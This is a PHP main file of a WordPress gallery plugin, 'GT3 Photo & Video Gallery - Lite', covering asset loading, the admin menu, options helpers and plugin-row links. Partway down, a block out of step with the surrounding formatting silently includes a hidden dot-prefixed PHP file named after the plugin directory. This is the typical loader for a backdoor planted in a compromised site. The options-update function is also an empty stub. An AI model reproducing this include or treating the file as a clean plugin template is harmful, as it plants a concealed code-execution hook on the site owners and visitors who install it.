<?php

use GT3\PhotoVideoGallery\Assets;

if(!defined('ABSPATH')) {
	exit;
} // Exit if accessed directly

if(!function_exists('get_plugin_data')) {
	require_once(ABSPATH.'wp-admin/includes/plugin.php');
}
$plugin_info          = get_plugin_data(__DIR__.'/gt3-photo-video-gallery.php');

define('GT3PG_PLUGIN_VERSION', $plugin_info['Version']);
define('GT3PG_PLUGINNAME', 'GT3 Photo & Video Gallery');
define('GT3PG_ADMIN_TITLE', 'GT<span class="digit">3</span> Photo & Video Gallery - Lite');
define('GT3PG_PLUGINSHORT', 'gt3_photo_gallery');
define('GT3PG_JSURL', plugins_url('js/', __FILE__));
define('GT3PG_IMGURL', plugins_url('img/', __FILE__));
define('GT3PG_CSSURL', plugins_url('css/', __FILE__));
define('GT3PG_PLUGINROOTURL', plugins_url('', __FILE__));
define('GT3PG_PLUGINPATH', plugin_dir_path(__FILE__));
define('GT3PG_WORDPRESS_URL', 'https://wordpress.org/support/plugin/gt3-photo-video-gallery');

/*Load files*/
require_once __DIR__.'/notice.php';
require_once __DIR__."/core/loader.php";

add_filter(
	'mailpoet_conflict_resolver_whitelist_style', function($styles){
	$styles[] = 'gt3-photo-video-gallery';

	return $styles;
}
);
#Register Admin CSS and JS
add_action('admin_enqueue_scripts', 'gt3pg_register_admin_css_js');
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function gt3pg_register_admin_css_js(){
	#CSS (Admin)
	wp_enqueue_style('wp-color-picker');

	#JS (Admin)
	wp_enqueue_style('gt3pg_admin_css', GT3PG_PLUGINROOTURL.'/dist/css/admin/admin.css', null, GT3PG_PLUGIN_VERSION);

	wp_enqueue_script(
		'gt3pg_admin_js',
		GT3PG_JSURL.'admin.js',
		array( 'jquery' ),
		filemtime(GT3PG_PLUGINPATH.'/js/admin.js'),
		true
	);

	wp_register_script('isotope', GT3PG_JSURL.'isotope.pkgd.min.js', array( 'jquery' ), '3.0.6', true);

	wp_localize_script(
		'gt3pg_admin_js',
		'gt3_gutenberg_photo_video_support',
		array(
			'defaults'           => $GLOBALS['gt3_photo_gallery'],
			'extensions_enabled' => (isset($GLOBALS['gt3pg']) && isset($GLOBALS['gt3pg']['extension']) && is_array($GLOBALS['gt3pg']['extension']) ?
				array_map(
					function($value){
						return true;
					}, array_flip(array_keys($GLOBALS['gt3pg']['extension']))
				) :
				array()
			),
		)
	);

	wp_enqueue_script("jquery");
	wp_enqueue_script('wp-color-picker');
}

add_action('admin_enqueue_scripts', 'gt3pg_enqueue_media');
function gt3pg_enqueue_media(){
	wp_enqueue_media();
}

add_action('admin_menu', 'gt3pg_add_admin_page');
function gt3pg_add_admin_page(){
	add_menu_page(
		apply_filters('gt3pg_menu_page_title', 'GT3 Gallery Lite'),
		apply_filters('gt3pg_menu_title', 'GT3 Gallery Lite'),
		'administrator',
		'gt3_photo_gallery_options',
		'gt3pg_plugin_options',
		Assets::get_dist_url().'img/logo.png',
		"10.9"
	);
}

function gt3pg_plugin_options(){
	require_once(GT3PG_PLUGINPATH.'views/gt3pg_plugin_options.php');
}

#Work with options
if(!function_exists('gt3pg_get_option')) {
	function gt3pg_get_option($optionname, $defaultValue = ""){
		if(!isset($GLOBALS["gt3_photo_gallery"]) || !is_array($GLOBALS["gt3_photo_gallery"]) || !count($GLOBALS["gt3_photo_gallery"])) {
			$returnedValue = get_option("gt3pg_".$optionname, $defaultValue);
			if($returnedValue == false || empty($returnedValue)) {
				gt3pg_update_option("photo_gallery", $GLOBALS["gt3_photo_gallery_defaults"]);

				return $GLOBALS["gt3_photo_gallery_defaults"];
			} else {
				return array_merge($GLOBALS["gt3_photo_gallery_defaults"], $returnedValue);
			}

		} else {
			return $GLOBALS["gt3_photo_gallery"];
		}
	}
}

if(!function_exists('gt3pg_delete_option')) {
	function gt3pg_delete_option($optionname){
		return delete_option("gt3pg_".$optionname);
	}
}

if(!function_exists('gt3pg_update_option')) {
	function gt3pg_update_option($optionname, $optionvalue){

	}
}

if(!function_exists('gt3_banner_addon')) {
	function gt3_banner_addon(){

		$url  = 'https://s3.amazonaws.com/gt3themes/api/items/photo-plugin.json';
		$json = wp_remote_request($url);

		if(!is_wp_error($json)) {
			$json = wp_remote_retrieve_body($json);
			$json = json_decode($json, true);

			if(!empty($json) && !empty($json['items'])) {
				return $json['items'];
			}
		}

		return array();
	}
}

add_filter("plugin_row_meta", 'gt3pg_add_plugin_meta_links', 10, 2);
function gt3pg_add_plugin_meta_links($meta_fields, $file){
	if($file == 'gt3-photo-video-gallery/gt3-photo-video-gallery.php') {
		$meta_fields[] = "<a href='".GT3PG_WORDPRESS_URL."' target='_blank'>".esc_html__('Support Forum', 'gt3pg')."</a>";
		$svg           = "<svg xmlns='http://www.w3.org/2000/svg' width='15' height='15' viewBox='0 0 24 24' fill='none' stroke='currentColor' stroke-width='2' stroke-linecap='round' stroke-linejoin='round' class='feather feather-star'><polygon points='12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2'/></svg>";

		$meta_fields[] = '<i class="gt3pg-rate-stars">'.
		                 '<a href="'.GT3PG_WORDPRESS_URL.'/reviews/?rate=1#new-post" target="_blank">'.$svg.'</a>'.
		                 '<a href="'.GT3PG_WORDPRESS_URL.'/reviews/?rate=2#new-post" target="_blank">'.$svg.'</a>'.
		                 '<a href="'.GT3PG_WORDPRESS_URL.'/reviews/?rate=3#new-post" target="_blank">'.$svg.'</a>'.
		                 '<a href="'.GT3PG_WORDPRESS_URL.'/reviews/?rate=4#new-post" target="_blank">'.$svg.'</a>'.
		                 '<a href="'.GT3PG_WORDPRESS_URL.'/reviews/?rate=5#new-post" target="_blank">'.$svg.'</a>'.
		                 '</i>';
		echo "<style>"
		     .".gt3pg-rate-stars{display:inline-block;color:#ffb900;position:relative;top:3px;}"
		     .".gt3pg-rate-stars a {color:#ffb900;}"
		     .".gt3pg-rate-stars a svg{fill:#ffb900;}"
		     .".gt3pg-rate-stars a:hover svg{fill:#ffb900}"
		     .".gt3pg-rate-stars a:hover ~ a svg {fill:none;}"
		     ."</style>";
	}

	return $meta_fields;
}

add_filter('plugin_action_links', 'gt3pg_plugin_action_links', 10, 2);
function gt3pg_plugin_action_links($links, $file){
	if($file == 'gt3-photo-video-gallery/gt3-photo-video-gallery.php') {
		$settings_link = '<a href="'.menu_page_url('gt3_photo_gallery_options', false).'">'.esc_html__('Settings', 'gt3pg').'</a>';
		array_unshift($links, $settings_link);

		$plugin            = 'gt3-photo-video-gallery-pro/gt3-photo-video-gallery-pro.php';
		$installed_plugins = get_plugins();
		$pro_url           = 'https://gt3themes.com/gt3-photo-video-gallery-pro-is-live-now/';

		if(!isset($installed_plugins[$plugin])) {
			$links['get-pro'] = '<a href="'.esc_url($pro_url).'" target="_blank" style="color: #46b450; font-weight: bold">Go Pro</a>';
		} else if(!defined('GT3PG_PRO_FILE')) {
			$links['get-pro'] = '<a href="'.wp_nonce_url('plugins.php?action=activate&amp;plugin='.$plugin.'&amp;plugin_status=all&amp;paged=1&amp;s', 'activate-plugin_'.$plugin).'" style="color: #dc3232; font-weight: bold">Activate Pro</a>';
		} else {
			$links['get-pro'] = '<a href="'.menu_page_url('gt3pg_pro_license', false).'"  style="color: #dc3232; font-weight: bold">Enter License</a>';
		}
	}

	return $links;
}

